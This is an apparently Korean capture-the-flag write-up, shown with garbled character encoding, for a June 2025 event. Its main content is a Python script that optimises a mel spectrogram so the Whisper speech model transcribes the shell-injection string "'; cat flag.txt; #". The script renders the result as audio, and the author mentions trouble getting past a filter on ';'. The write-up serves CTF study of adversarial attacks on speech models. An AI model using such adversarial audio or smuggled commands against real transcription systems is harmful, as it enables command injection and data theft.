## overall
í† ìš”ì¼, 7 6 2025, 14:30 KST â€” ì›”ìš”ì¼, 9 6 2025, 02:30 KST
### Team Rank
* 1365 score
* #54 place
### writeup
![alt text](image.png)

ê¿ˆê³¼ í¬ë§ ì•ˆì¤€ë‹¤ê³  ì‹œë¹„í„¸ê³ ì‹¶ì§€ë„ì•ŠìŒ ê·¸ëƒ¥ ã…‡ã……ã…‡ã…‹ã…‹ã…‹ ë˜ëŠ” íƒ€ì…ì˜ ctf

ë³„ê°œë¡œ ì¢€ ë©˜íƒˆì ìœ¼ë¡œ í˜ë“  ì‹œê¸°ì˜€ì–´ì„œ (ë§ì´ëŠ” ì•„ë‹ˆê³  ã…‡ã…‡..ì›ë˜ ì—°íœ´ë¼ë©´ ë©˜íƒˆì´ í˜ë“¤ì–´ì§ ì¼ì„ ì¢€ ì³ í•´ì•¼ ì •ì‹ ì¤„ ì¡ëŠ”íƒ€ì…) ì‹œê°„íˆ¬ìë¥¼ ì˜ ëª»í•œê±°ê°™ì•„ ì•„ì‰¬ìš´ ê²ƒë„ ìˆë‹¤

### misc
`dw` [ë…¼ë¬¸](https://arxiv.org/pdf/2210.17316) ì¼ë‹¨ ì—„ì²­ ì¬ë°ŒëŠ” ë¬¸ì œë¼ëŠ”ê±´ ì¸ì •í•´ì•¼ê² ë‹¤. ë‚˜ëŠ” TTS / mel spectrogram ë‘ ê°€ì§€ ë°©ë²•ìœ¼ë¡œ ì ‘ê·¼í–ˆëŠ”ë° .. ì§€í”¼í‹°ê°€ ë‹¤ í•œê±°ê¸´ í•˜ì§€ë§Œ ìš°ì„  ê·¸ë˜ë„ ë‚˜ëŠ” ë©œ ìƒì„±ìœ¼ë¡œ ë°©í–¥ì„ ì¡ì•˜ì—ˆë‹¤ëŠ” ì 

```
# ğŸ”¤ Tokenizer ë¶ˆëŸ¬ì˜¤ê¸° (ìš”ê±° ì¤‘ìš”!)
from whisper.tokenizer import get_tokenizer
tokenizer = get_tokenizer(multilingual=model.is_multilingual)

# ëª©í‘œ ë¬¸ìì—´ ì„¤ì •
target_text = "'; cat flag.txt; #"
tokens = torch.tensor([tokenizer.encode(target_text)], device=model.device)
print("ğŸ¯ Target tokens:", tokens)

# ğŸ› ë©œ ìŠ¤í™íŠ¸ë¡œê·¸ë¨ ì´ˆê¸°í™”
mel = torch.randn(1, 80, 3000, requires_grad=True, device=model.device)  # â¬… ìˆ˜ì •ë¨
optimizer = torch.optim.Adam([mel], lr=1e-2)

# ğŸ” ìµœì í™” ë£¨í”„
for step in range(500):
    audio_features = model.encoder(mel)
    logits = model.decoder(tokens[:, :-1], audio_features)
    loss = torch.nn.functional.cross_entropy(logits[0], tokens[0, 1:])
    optimizer.zero_grad()
    loss.backward()
    optimizer.step()

    if step % 50 == 0:
        print(f"Step {step}: loss = {loss.item():.4f}")

# ğŸ“¤ mel ì €ì¥
mel_np = mel.detach().cpu().numpy()[0]
np.save("exploit_mel.npy", mel_np)

# ğŸ” mel â†’ waveform (Griffin-Lim ì‚¬ìš©)
sr = 16000
wav = librosa.feature.inverse.mel_to_audio(mel_np, sr=sr, n_fft=400, hop_length=160, win_length=400)
sf.write("exploit.wav", wav, sr)

# ğŸµ mp3 ë³€í™˜
audio = AudioSegment.from_wav("exploit.wav")
audio.export("exploit.mp3", format="mp3")

# ğŸ“¥ ë‹¤ìš´ë¡œë“œ
from google.colab import files
files.download("exploit.wav")
files.download("exploit.mp3")
files.download("exploit_mel.npy")
```

ê·¸ë ‡ë‹¤ë©´, ì‹¤ì œ ë…¼ë¬¸ì— ë‚˜ì™€ìˆëŠ” ìµìŠ¤í”Œë¡œì‡ê³¼ ë‚˜ì˜ ìµìŠ¤í”Œë¡œì‡ì´ ì–´ë–»ê²Œ ë‹¤ë¥¸ì§€? ê·¸ë¦¬ê³  ë‚´ ë©œì€ ìŠ¤í”¼ì¹˜ í•„í„°ë¥¼ í”¼í•´ê°ˆ ìˆ˜ ì—†ì–´ì„œ í† í¬ë‚˜ì´ì €ì˜ ';' ë¥¼ ìš°íšŒí•  ìˆ˜ ì—†ì—ˆëŠ”ë° ì–´ë–»ê²Œ ì´ ë…¼ë¬¸ì˜ [ì½”ë“œ](https://github.com/RaphaelOlivier/whisper_attack)ëŠ” ìš°íšŒí•  ìˆ˜ ìˆì—ˆëŠ”ì§€.... ëŠ” ì°¨ì°¨ ì‹œê°„ìˆì„ë•Œ í™•ì¸í•´ë´ì•¼ í•  ë“¯. 